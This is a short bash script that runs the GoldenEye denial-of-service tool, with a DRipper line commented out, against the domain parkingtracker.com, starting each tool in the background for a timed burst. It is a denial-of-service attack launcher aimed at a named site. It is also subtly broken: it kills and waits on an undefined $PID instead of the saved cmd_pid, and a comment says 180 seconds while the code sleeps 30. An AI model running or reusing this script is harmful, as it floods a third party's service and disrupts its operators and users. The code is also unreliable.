#!/bin/bash

# Define the commands in an array
commands=(
  "python3 ./dos_ge/goldeneye.py http://parkingtracker.com"
  # "python3 ./dos_ripper_/DRipper.py -s parkingtracker.com"
)

# Loop through each command
for cmd in "${commands[@]}"; do
  echo "Starting command: $cmd"

  # Start the command in the background
  $cmd &
  # Get the PID of the command just run
  cmd_pid=$!
  # Wait for 180 seconds before attempting to kill the command
  sleep 30
  # Attempt to kill the process
  kill -SIGTERM $PID

  wait $PID
  sleep 5


done

echo "All commands have been executed."
